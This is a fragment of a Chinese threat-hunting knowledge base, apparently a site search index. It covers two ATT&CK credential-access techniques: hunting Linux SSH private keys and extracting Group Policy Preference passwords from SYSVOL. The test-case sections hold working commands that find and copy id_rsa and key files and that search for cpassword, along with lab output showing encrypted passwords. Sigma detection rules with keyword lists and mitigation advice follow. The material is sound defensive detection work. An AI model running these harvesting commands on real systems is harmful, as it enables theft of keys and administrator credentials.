<p>https://www.cnblogs.com/bldly1989/p/7204358.html</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-004-linux-%E7%A7%81%E9%92%A5/","title":"T1552-004-linux-\u79c1\u94a5","text":""},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-004-linux-%E7%A7%81%E9%92%A5/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u4ee5\u4ece\u88ab\u5165\u4fb5\u7684\u7cfb\u7edf\u4e0a\u6536\u96c6\u79c1\u94a5\uff0c\u7528\u4e8e\u5bf9SSH\u7b49\u8fdc\u7a0b\u670d\u52a1\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\uff08\u66b4\u529b\u7834\u89e3\u7b49\uff09\uff0c\u6216\u8005\u7528\u4e8e\u89e3\u5bc6\u5176\u4ed6\u6536\u96c6\u7684\u6587\u4ef6\uff0c\u5982\u7535\u5b50\u90ae\u4ef6\u3002\u901a\u7528\u5bc6\u94a5\u548c\u8bc1\u4e66\u6587\u4ef6\u6269\u5c55\u540d\u5305\u62ec\uff1a.key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. \uff1b\u653b\u51fb\u8005\u8fd8\u53ef\u4ee5\u67e5\u770b\u5e38\u89c1\u7684\u5bc6\u94a5\u76ee\u5f55\uff0c\u4f8b\u5982\u57fa\u4e8elinux/unix\u7684\u7cfb\u7edf\u4e0b\u7684~/.ssh\u76ee\u5f55\u6216Windows \u4e0a\u7684SSH\u5bc6\u94a5C:\\Users(username).ssh\\\u3002</p> <p>\u79c1\u94a5\u5e94\u8be5\u9700\u8981\u5bc6\u7801\u6765\u8fdb\u884c\u64cd\u4f5c\uff0c\u56e0\u6b64\u653b\u51fb\u8005\u4e5f\u53ef\u4ee5\u4f7f\u7528\u952e\u76d8\u8bb0\u5f55\u83b7\u53d6\u5bc6\u7801\u6216\u5c1d\u8bd5\u79bb\u7ebf\u7206\u7834\u8d26\u53f7\u5bc6\u7801\u3002</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-004-linux-%E7%A7%81%E9%92%A5/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>find / -type f ( -name \".pem\" -o -name \".pgp\" -o -name \".gpg\" -o -name \".ppk\" -o -name \".p12\" -o -name \".key\" -o -name \".pfx\" -o -name \".cer\" -o -name \".p7b\" -o -name \".asc\" -o -name \"authorized*\" )</p> <p>\u67e5\u627e\u7528\u6237\u7684SSH\u79c1\u94a5\uff1afind / -name id_rsa OR find / -name id_dsa</p> <p>\u4f7f\u7528CP\u590d\u5236SSH\u79c1\u94a5\uff1afind / -name id_rsa -exec cp --parents {} #{output_folder} ;</p> <p>find / -name id_dsa -exec cp --parents {} #{output_folder} ;</p> <p>\u4f7f\u7528rsync\u590d\u5236SSH\u79c1\u94a5\uff1afind / -name id_rsa -exec rsync -R {} #{output_folder} ;</p> <p>find / -name id_dsa -exec rsync -R {} #{output_folder} ;</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-004-linux-%E7%A7%81%E9%92%A5/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>bash\u5386\u53f2\u8bb0\u5f55</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-004-linux-%E7%A7%81%E9%92%A5/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>icbc@icbc:/$ sudo find / -name id_rsa</p> <p>\u4e0d\u518d\u8fdb\u884c\u4e00\u4e00\u6d4b\u8bd5</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-004-linux-%E7%A7%81%E9%92%A5/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>icbc@icbc:/$ history</p> <p>639  sudo find / -name id_rsa</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-004-linux-%E7%A7%81%E9%92%A5/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-004-linux-%E7%A7%81%E9%92%A5/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: \u653b\u51fb\u8005\u67e5\u627elinux\u4e0b\u79c1\u94a5\u6587\u4ef6\ndescription: Ubuntu18.04\nreferences: https://github.com/12306Bro/Threathunting/blob/master/T1145-linux-\u79c1\u94a5.md\ntags: T1552-004\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n    product: linux\n    service: history\ndetection:\n    keywords:\n       - sudo find / -name *.pgp\n       - sudo find / -name *.pem\n       - sudo find / -name *.ppk\n       - sudo find / -name *.p12\n       - sudo find / -name *.key\n    condition: keywords\nlevel: medium\n</code></pre>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-004-linux-%E7%A7%81%E9%92%A5/#_6","title":"\u5efa\u8bae","text":"<p>\u6682\u65e0</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-004-linux-%E7%A7%81%E9%92%A5/#_7","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1552-004</p> <p>https://attack.mitre.org/techniques/T1552/004/</p> <p>linux\u4e0b\u7684rsync\u516d\u4e2a\u4f7f\u7528\u5b9e\u4f8b</p> <p>https://www.linuxprobe.com/how-linux-rsync.html</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-006-win-GPP-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/","title":"T1552-006-windows-\u57fa\u4e8eGPP\u51ed\u8bc1\u83b7\u53d6","text":""},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-006-win-GPP-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#attck","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0","text":"<p>\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c1d\u8bd5\u5728\u7ec4\u7b56\u7565\u9996\u9009\u9879\uff08GPP\uff09\u4e2d\u67e5\u627e\u4e0d\u5b89\u5168\u7684\u51ed\u636e\u3002GPP\u662f\u5141\u8bb8\u7ba1\u7406\u5458\u4f7f\u7528\u5d4c\u5165\u5f0f\u51ed\u636e\u521b\u5efa\u57df\u7b56\u7565\u7684\u5de5\u5177\u3002\u8fd9\u4e9b\u7b56\u7565\u5141\u8bb8\u7ba1\u7406\u5458\u8bbe\u7f6e\u672c\u5730\u5e10\u6237\u3002</p> <p>\u8fd9\u4e9b\u7ec4\u7b56\u7565\u5b58\u50a8\u5728\u57df\u63a7\u5236\u5668\u4e0a\u7684SYSVOL\u4e2d\u3002\u8fd9\u610f\u5473\u7740\u4efb\u4f55\u57df\u7528\u6237\u90fd\u53ef\u4ee5\u67e5\u770bSYSVOL\u5171\u4eab\u5e76\u89e3\u5bc6\u5bc6\u7801\uff08\u4f7f\u7528\u5df2\u516c\u5f00\u7684AES\u5bc6\u94a5\uff09\u3002</p> <p>\u4ee5\u4e0b\u5de5\u5177\u548c\u811a\u672c\u53ef\u7528\u4e8e\u4ece\u7ec4\u7b56\u7565\u9996\u9009\u9879XML\u6587\u4ef6\u6536\u96c6\u548c\u89e3\u5bc6\u5bc6\u7801\u6587\u4ef6\uff1a</p> <p>Metasploit\u7684\u540e\u671f\u5f00\u53d1\u6a21\u5757:</p> <p>post/windows/gather/credentials/gpp</p> <p>Get-GPPPassword</p> <p>gpprefdecrypt.py</p> <p>\u5728SYSVOL\u5171\u4eab\u4e0a\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u6765\u679a\u4e3e\u6f5c\u5728\u7684GPP XML\u6587\u4ef6\uff1adir /s * .xml</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-006-win-GPP-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#gpp","title":"\u7ec4\u7b56\u7565\u9996\u9009\u9879\uff08GPP\uff09","text":"<p>\u7ec4\u7b56\u7565\u9996\u9009\u9879\uff08GPP\uff09\u662f\u5141\u8bb8\u7ba1\u7406\u5458\u4f7f\u7528\u5d4c\u5165\u5f0f\u51ed\u636e\u521b\u5efa\u57df\u7b56\u7565\u7684\u5de5\u5177\u3002\u9664\u5176\u4ed6\u5916\uff0c\u8fd9\u4e9b\u7b56\u7565\u5141\u8bb8\u7ba1\u7406\u5458\u8bbe\u7f6e\u672c\u5730\u5e10\u6237\u3002</p> <p>\u8fd9\u4e9b\u7ec4\u7b56\u7565\u5b58\u50a8\u5728\u57df\u63a7\u5236\u5668\u4e0a\u7684SYSVOL\u4e2d\uff0c\u8fd9\u610f\u5473\u7740\u4efb\u4f55\u57df\u7528\u6237\u90fd\u53ef\u4ee5\u67e5\u770bSYSVOL\u5171\u4eab\u5e76\u89e3\u5bc6\u5bc6\u7801AES\u79c1\u94a5\u5df2\u5728\u7ebf\u6cc4\u9732\u3002</p> <p>SYSVOL \u662f\u5728\u57df\u4e2d\u5168\u57df\u5171\u4eab\u7684\uff0c\u6240\u6709\u8ba4\u8bc1\u57df\u7528\u6237\u90fd\u6709\u8bfb\u6743\u9650\u3002SYSVOL \u5305\u542b\u767b\u5f55\u811a\u672c\u3001\u7ec4\u7b56\u7565\u6570\u636e\uff0c\u4ee5\u53ca\u57df\u63a7\u9700\u8981\u8bbf\u95ee\u7684\u5176\u4ed6\u57df\u91cc\u9762\u7684\u6570\u636e\uff08SYSVOL \u4e2d\u7684\u6570\u636e\u81ea\u52a8\u88ab\u6240\u6709\u57df\u63a7\u6240\u5171\u4eab\uff09\u6240\u6709\u7684\u7ec4\u7b56\u7565\u90fd\u5b58\u50a8\u5728\u8fd9\u4e2a\u4f4d\u7f6e\uff1a</p> <pre><code>\\\\&lt;DOMAIN&gt;\\SYSVOL\\&lt;DOMAIN&gt;\\Policies\\\n</code></pre>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-006-win-GPP-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_1","title":"\u6d4b\u8bd5\u6848\u4f8b","text":"<p>\u6700\u7b80\u5355\u7684\u65b9\u6cd5\u5c31\u662f\u4e0d\u9700\u8981\u4efb\u4f55\u9ed1\u5ba2\u5de5\u5177\uff0c\u653b\u51fb\u8005\u9700\u8981\u6253\u5f00\u6587\u4ef6\u6d4f\u89c8\u7684\u7a97\u53e3\u5e76\u4e14\u5728\u67e5\u627e\u57df\u6587\u4ef6\u5171\u4eab\u76ee\u5f55\u4e2d\u7684 XML \u6587\u4ef6\u3002\u901a\u5e38\u8fd9\u4e9b\u6587\u4ef6\u4f1a\u5305\u542b\u51ed\u636e\uff1aroups.xml\u3001scheduledtasks.xml\u3001Services.xml\u3002</p> <p>\u4efb\u4f55\u7ecf\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u7684\u7528\u6237 (\u4efb\u4f55\u57df\u4e2d\u7528\u6237\u6216\u8005\u53d7\u4fe1\u4efb\u57df\u4e2d\u7684\u7528\u6237) \u90fd\u53ef\u4ee5\u67e5\u770b SYSVOL \u4e2d\u7684\u5305\u542b AES \u52a0\u5bc6\u5bc6\u7801\u7684 XML \u6587\u4ef6\u3002</p> <p>\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u8bbf\u95ee\u6b64 XML \u6587\u4ef6\uff0c\u4f7f\u7528 AES \u79c1\u94a5\u6765\u89e3\u5bc6 GPP \u5bc6\u7801</p> <p>\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u5de5\u5177\u548c\u811a\u672c\u4ece\u7ec4\u7b56\u7565\u9996\u9009\u9879XML\u6587\u4ef6\u4e2d\u6536\u96c6\u548c\u89e3\u5bc6\u5bc6\u7801\u6587\u4ef6\uff1a</p> <ul> <li>Get-GPPPassword</li> <li>gpprefdecrypt.py</li> <li>......</li> </ul> <p>\u6ce8\u610f\uff1a\u5728SYSVOL\u5171\u4eab\u4e0a\uff0c\u4ee5\u4e0b\u547d\u4ee4\u53ef\u7528\u4e8e\u679a\u4e3e\u6f5c\u5728\u7684XML\u6587\u4ef6dir / s * .xml</p> <pre><code>findstr /S /I cpassword \\\\0day.org\\sysvol\\0day.org\\policies\\*.xml\n</code></pre> <p>\u5bf9\u4e8e\u901a\u8fc7\u7ec4\u7b56\u7565\u9996\u9009\u9879\u5b8c\u6210\u7684\u8bbe\u7f6e\uff0c\u6570\u636e\u5b58\u50a8\u5728SYSVOL\u6587\u4ef6\u5939\u4e2d\u7684XML\u6587\u4ef6\u4e2d\u3002\u5bf9\u4e8e\u67d0\u4e9b\u8bbe\u7f6e\uff0c\u9700\u8981\u7528\u6237\u51ed\u636e\uff0c\u4f8b\u5982\uff1a</p> <ul> <li>\u6620\u5c04\u9a71\u52a8\u5668\uff08Drives.xml\uff09</li> <li>\u521b\u5efa\u672c\u5730\u7528\u6237\uff08unattend.xml\uff09</li> <li>\u6570\u636e\u6e90\uff08DataSources.xml\uff09</li> <li>\u6253\u5370\u673a\u914d\u7f6e\uff08Printers.xml\uff09</li> <li>\u521b\u5efa/\u66f4\u65b0\u670d\u52a1\uff08Services.xml\uff09</li> <li>\u8ba1\u5212\u4efb\u52a1\uff08ScheduledTasks.xml\uff09</li> <li>\u66f4\u6539\u672c\u5730\u7ba1\u7406\u5458\u5bc6\u7801</li> <li>\u7ec4\u7b56\u7565\u9996\u9009\u9879\uff08Groups.xml\uff09</li> </ul> <p>\u53ef\u4ee5\u4f7f\u7528\u5173\u952e\u5b57\u641c\u7d22\u5728SYSVOL\u6587\u4ef6\u5939\u4e2d\u641c\u7d22\u8fd9\u4e9bXML\u6587\u4ef6\u3002\u53ef\u4ee5\u4f7f\u7528\u952e\u503c\u201c cpassword \u201d \u641c\u7d22XML\u6587\u4ef6\u4e2d\u7684\u5bc6\u7801\u3002</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-006-win-GPP-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_2","title":"\u68c0\u6d4b\u65e5\u5fd7","text":"<p>windows \u5b89\u5168\u65e5\u5fd7</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-006-win-GPP-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_3","title":"\u6d4b\u8bd5\u590d\u73b0","text":"<p>\u7ec4\u7b56\u7565\u9996\u9009\u9879\u5141\u8bb8\u7ba1\u7406\u5458\u5728Active Directory\u57df\u4e2d\u7684\u670d\u52a1\u5668\u548c\u5de5\u4f5c\u7ad9\u4e0a\u521b\u5efa\u548c\u7ba1\u7406\u672c\u5730\u5e10\u6237\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u8f7b\u677e\u627e\u5230\u5e76\u83b7\u53d6\u7531\u7ec4\u7b56\u7565\u9996\u9009\u9879\u7ba1\u7406\u7684\u7ba1\u7406\u5e10\u6237\u51ed\u636e\u7684\u52a0\u5bc6\u5bc6\u7801\uff0c\u7136\u540e\u4f7f\u7528Microsoft\u53d1\u5e03\u7684AES\u5bc6\u94a5\u5bf9\u5176\u8fdb\u884c\u89e3\u5bc6\u3002</p> <p>\u4ee5\u4e0b\u662f\u653b\u51fb\u7684\u5de5\u4f5c\u65b9\u5f0f\u7684\u6458\u8981\uff1a</p> <ol> <li>\u653b\u51fb\u8005\u5229\u7528PowerShell\u6216PowerSploit\u7684Get-GPPPassword\u547d\u4ee4\u7b49\u5176\u4ed6\u5de5\u5177\uff0c\u5728\u57df\u63a7\u5236\u5668\u7684SYSVOL\u5171\u4eab\u4e0a\u627e\u5230\u5305\u542bAES\u52a0\u5bc6\u7684\u672c\u5730\u5e10\u6237\u5bc6\u7801\u7684\u7ec4\u7b56\u7565XML\u6587\u4ef6\u3002</li> <li>\u653b\u51fb\u8005\u7ed3\u5408Microsoft\u53d1\u5e03\u7684AES\u5bc6\u94a5\uff0c\u5bf9\u5bc6\u7801\u8fdb\u884c\u89e3\u5bc6\uff0c\u4ee5\u660e\u6587\u5f62\u5f0f\u663e\u793a\u7ba1\u7406\u5e10\u6237\u5bc6\u7801\u3002</li> </ol> <p>\u7531\u4e8eSYSVOL\u5171\u4eab\u5bf9\u7ecf\u8fc7\u8eab\u4efd\u9a8c\u8bc1\u7684\u7528\u6237\u5f00\u653e\uff0c\u56e0\u6b64\u7ec4\u7ec7\u5185\u7684\u4efb\u4f55\u4eba\u90fd\u53ef\u4ee5\u8bfb\u53d6\u6b64\u5904\u5b58\u50a8\u7684\u6587\u4ef6\u3002\u56e0\u6b64\uff0c\u4efb\u4f55\u7528\u6237\u5e10\u6237\u90fd\u53ef\u4ee5\u67e5\u627e\u548c\u89e3\u5bc6\u8fd9\u4e9b\u6587\u4ef6\uff0c\u5e76\u53ef\u4ee5\u8bbf\u95ee\u7ba1\u7406\u5458\u5e10\u6237\u7684\u7eaf\u6587\u672c\u5bc6\u7801\u3002</p> <pre><code>Microsoft Windows [\u7248\u672c 6.1.7601]\n\u7248\u6743\u6240\u6709 (c) 2009 Microsoft Corporation\u3002\u4fdd\u7559\u6240\u6709\u6743\u5229\u3002\n\nC:\\Windows\\system32&gt;findstr /S /I cpassword \\\\0day.org\\sysvol\\0day.org\\policies\\\n*.xml\n\\\\0day.org\\sysvol\\0day.org\\policies\\{0EA52652-3A0D-4135-8BD7-92EFF59CB765}\\Machi\nne\\Preferences\\Groups\\Groups.xml:&lt;Groups clsid=\"{3125E937-EB16-4b4c-9934-544FC6D\n24D26}\"&gt;&lt;User clsid=\"{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}\" name=\"tester\" image\n=\"0\" changed=\"2019-05-20 06:34:56\" uid=\"{47664872-E0C4-4476-A963-9F34564042B1}\"&gt;\n&lt;Properties action=\"C\" fullName=\"\" description=\"\" cpassword=\"WzC8r0KH+edYsh0heQv\nAVwcNxtSvX1efu9MU+z5e37E\" changeLogon=\"0\" noChange=\"0\" neverExpires=\"1\" acctDisa\nbled=\"0\" userName=\"tester\"/&gt;&lt;/User&gt;\n\\\\0day.org\\sysvol\\0day.org\\policies\\{0EA52652-3A0D-4135-8BD7-92EFF59CB765}\\Machi\nne\\Preferences\\Groups\\Groups.xml:       &lt;User clsid=\"{DF5F1855-51E5-4d24-8B1A-D9\nBDE98BA1D1}\" name=\"klionsec\" image=\"0\" changed=\"2019-05-20 06:35:29\" uid=\"{FBA27\n650-BF8A-4EA4-A308-91540384B7E2}\"&gt;&lt;Properties action=\"C\" fullName=\"\" description\n=\"\" cpassword=\"tlKQrm9IwkVCQX65tWY+KZ1iBu7tbjQ/2vCOFU3Kkiw\" changeLogon=\"0\" noCh\nange=\"0\" neverExpires=\"1\" acctDisabled=\"0\" userName=\"klionsec\"/&gt;&lt;/User&gt;\n</code></pre>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-006-win-GPP-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_4","title":"\u6d4b\u8bd5\u7559\u75d5","text":"<p>\u6682\u65e0</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-006-win-GPP-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_5","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def","text":""},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-006-win-GPP-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#sigma","title":"sigma\u89c4\u5219","text":"<pre><code>title: \u57fa\u4e8eGPP\u51ed\u8bc1\u83b7\u53d6findstr\u67e5\u627esysvol\u5185\u6f5c\u5728\u7684XML\u6587\u4ef6(\u53d1\u8d77\u653b\u51fb\u673a)\ndescription: windows server 2008 \u6a21\u62df\u6d4b\u8bd5\u7ed3\u679c\nreferences: https://adsecurity.org/?p=2288\ntags: T1552-006\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection1:\n        EventID: 4688  # \u8fdb\u7a0b\u521b\u5efa\n        NewProcessname: 'C:\\Windows\\System32\\findstr.exe'\n    selection2:\n        EventID: 5156\n        Direction: '\u51fa\u7ad9'  #\u65b9\u5411\u4e3a\u51fa\u7ad9\n        DestinationPort: 445  #\u76ee\u6807\u7aef\u53e3\u4e3a445\n    selection3:\n        EventID: 4689 #\u8fdb\u7a0b\u5173\u95ed\n        Processname: 'C:\\Windows\\System32\\findstr.exe'\n    timeframe: last 30s  \n    condition: all of them\nlevel: medium\n\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\u2014\ntitle: \u57fa\u4e8eGPP\u51ed\u8bc1\u83b7\u53d6findstr\u67e5\u627esysvol\u5185\u6f5c\u5728\u7684XML\u6587\u4ef6(\u4e3b\u57df\u63a7\u670d\u52a1\u5668)\ndescription: windows server 2008 \u6a21\u62df\u6d4b\u8bd5\u7ed3\u679c\nreferences: https://adsecurity.org/?p=2288\ntags: T1552-006\nstatus: experimental\nauthor: 12306Bro\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection1:\n        EventID: 5156  #Windows \u7b5b\u9009\u5e73\u53f0\u5df2\u5141\u8bb8\u8fde\u63a5\u3002\n        Direction: '\u5165\u7ad9'  #\u65b9\u5411\u4e3a\u5165\u7ad9\n        SourcePort: 445  #\u6e90\u7aef\u53e3\u4e3a445\n    selection2:\n        EventID: 4672  #\u4e3a\u65b0\u767b\u5f55\u5206\u914d\u4e86\u7279\u6b8a\u6743\u9650\u3002\n    selection3:\n        EventID: 4624 #\u5df2\u6210\u529f\u767b\u5f55\u5e10\u6237\u3002\n        LogonType: 3  #\u767b\u9646\u7c7b\u578b\u4e3a3\n        LogonProcess: 'Kerberos' #\u767b\u9646\u8fdb\u7a0b\u4e3akerberos  \u8be6\u7ec6\u8eab\u4efd\u9a8c\u8bc1\u4fe1\u606f\n        AuthenticationPackage: 'Kerberos' #\u8eab\u4efd\u9a8c\u8bc1\u6570\u636e\u5305Kerberos   \u8be6\u7ec6\u8eab\u4efd\u9a8c\u8bc1\u4fe1\u606f\n    selection4:\n        EventID: 5140  #\u5df2\u8bbf\u95ee\u7f51\u7edc\u5171\u4eab\u5bf9\u8c61\u3002\n        Objecttype: 'File' #\u7f51\u7edc\u4fe1\u606f&gt;\u5bf9\u8c61\u7c7b\u578b\n        ShareName: '\\\\*\\SYSVOL' #\u5171\u4eab\u4fe1\u606f&gt;\u5171\u4eab\u540d:\\\\*\\SYSVOL\n        Sharedpath: '\\??\\C:\\Windows\\SYSVOL\\sysvol' #\u5171\u4eab\u8def\u5f84\n    selection5:\n        EventID: 5145  #\u5df2\u68c0\u67e5\u7f51\u7edc\u5171\u4eab\u5bf9\u8c61\u662f\u5426\u53ef\u4ee5\u6388\u4e88\u5ba2\u6237\u7aef\u6240\u9700\u7684\u8bbf\u95ee\u6743\u9650\u3002\n        Objecttype: 'File' #\u7f51\u7edc\u4fe1\u606f&gt;\u5bf9\u8c61\u7c7b\u578b\n        ShareName: '\\\\*\\SYSVOL' #\u5171\u4eab\u4fe1\u606f&gt;\u5171\u4eab\u540d:\\\\*\\SYSVOL\n        Shared path: '\\??\\C:\\Windows\\SYSVOL\\sysvol' #\u5171\u4eab\u8def\u5f84\n    timeframe: last 30s  \n    condition: all of them\nlevel: medium\n</code></pre>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-006-win-GPP-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_6","title":"\u5efa\u8bae","text":"<p>\u5173\u8054\u5206\u6790\u601d\u8def\uff1a\u5728\u4e3b\u57df\u63a7\u4e0a\u63d0\u53d6\u5230\u7684\u6e90IP\u5730\u5740\uff0c\u5c31\u662f\u7591\u4f3c\u53d1\u8d77\u653b\u51fb\u7684\u4e3b\u673a\u5730\u5740\u30025145\u30015140\u65e5\u5fd7\u4f1a\u8fdb\u884c\u8bb0\u5f55\u3002\u5728\u7591\u4f3c\u53d1\u8d77\u653b\u51fb\u7684\u4e3b\u673a\u4e0a\u67e5\u770b5156\u4e8b\u4ef6</p> <p>\u6ce8\u610f\uff1a\u4e3b\u57df\u63a7\u670d\u52a1\u5668\u4e0a5156\u4e2d\u8bb0\u5f55\u7684\u76ee\u6807\u5730\u5740\u5373\u4e3a\u7591\u4f3c\u53d1\u8d77\u653b\u51fb\u7684\u4e3b\u673a\u5730\u5740\uff1b\u7591\u4f3c\u53d1\u8d77\u653b\u51fb\u7684\u4e3b\u673a\u4e2d5156\u8bb0\u5f55\u7684\u76ee\u6807\u5730\u5740\u5373\u662f\u4e3b\u57df\u63a7\u670d\u52a1\u5668\u3002\u53ef\u5728\u4e3b\u57df\u63a7\u4e0a\u8fdb\u884c\u68c0\u6d4b\u9891\u7e41\u53d1\u8d775156\u4e8b\u4ef6\u3002</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-006-win-GPP-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_7","title":"\u7f13\u89e3\u63aa\u65bd","text":"<p>\u901a\u8fc7\u7ec4\u7b56\u7565\u9996\u9009\u9879\u7f13\u89e3\u660e\u6587\u5bc6\u7801\u63d0\u53d6\u5a01\u80c1\u7684\u7b2c\u4e00\u6b65\u662f\u4e86\u89e3\u73af\u5883\u4e2d\u662f\u5426\u5b58\u5728\u8fd9\u79cd\u60c5\u51b5\u3002Microsoft\u5728\u5176\u5b89\u5168\u516c\u544a\u4e2d\u63d0\u4f9b\u4e86\u6709\u5173\u6b64\u6f0f\u6d1e\u7684\u811a\u672c\uff0c\u53ef\u4ee5\u5229\u7528\u8be5\u811a\u672c\uff0c\u5e76\u4e14\u8fd8\u8bbe\u8ba1\u4e86\u8f6f\u4ef6\u89e3\u51b3\u65b9\u6848\u6765\u67e5\u627e\u53ef\u4ee5\u4f7f\u7528\u6b64\u65b9\u6cd5\u7a83\u53d6\u7684\u5bc6\u7801\u5b9e\u4f8b\u3002</p> <p>\u4e00\u65e6\u786e\u5b9a\u4e86\u6f5c\u5728\u7684\u6f0f\u6d1e\uff0c\u5efa\u8bae\u627e\u5230\u5176\u4ed6\u65b9\u6cd5\u6765\u542f\u7528\u5148\u524d\u901a\u8fc7\u7ec4\u7b56\u7565\u9996\u9009\u9879\u8fdb\u884c\u7684\u4efb\u52a1\u6216\u8fc7\u7a0b\u3002\u4f8b\u5982\uff0cMicrosoft\u7684\u672c\u5730\u7ba1\u7406\u5458\u5bc6\u7801\u89e3\u51b3\u65b9\u6848\uff08LAPS\uff09\u662f\u4e00\u79cd\u6f5c\u5728\u7684\u89e3\u51b3\u65b9\u6848\uff0c\u7528\u4e8e\u63d0\u4f9b\u5bf9\u7cfb\u7edf\u7684\u7ba1\u7406\u8bbf\u95ee\u6743\u9650\uff0c\u800c\u4e0d\u662f\u901a\u8fc7\u7ec4\u7b56\u7565\u9996\u9009\u9879\u63d0\u4f9b\u767b\u5f55\u811a\u672c\u3002</p>"},{"location":"0x8_%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/T1552-006-win-GPP-%E5%87%AD%E8%AF%81%E8%BD%AC%E5%82%A8/#_8","title":"\u53c2\u8003\u63a8\u8350","text":"<p>MITRE-ATT&amp;CK-T1552-006</p> <p>https://attack.mitre.org/techniques/T1552/006/</p> <p>[\u7ffb\u8bd1 + \u5b9e\u8df5] \u51e0\u79cd\u83b7\u53d6\u57df\u7ba1\u7406\u5458\u6743\u9650\u7684\u65b9\u5f0f</p> <p>https://attacker.cc/index.php/archives/10/</p> <p>\u57df\u5b89\u5168\u7bc7:\u5bfb\u627eSYSVOL\u91cc\u7684\u5bc6\u7801\u548c\u653b\u51fbGPP\uff08\u7ec4\u7b56\u7565\u504f\u597d\uff09</p> <p>https://www.freebuf.com/vuls/92016.html</p> <p>\u5229\u7528\u57df\u51ed\u636e:\u89e3\u5bc6GPP\u4e2d\u7684\u7ba1\u7406\u5458\u5bc6\u7801</p> <p>https://www.cnblogs.com/index-htm/p/5412496.html</p> <p>\u5728SYSVOL\u4e2d\u67e5\u627e\u5bc6\u7801\u5e76\u5229\u7528\u7ec4\u7b56\u7565\u9996\u9009\u9879</p> 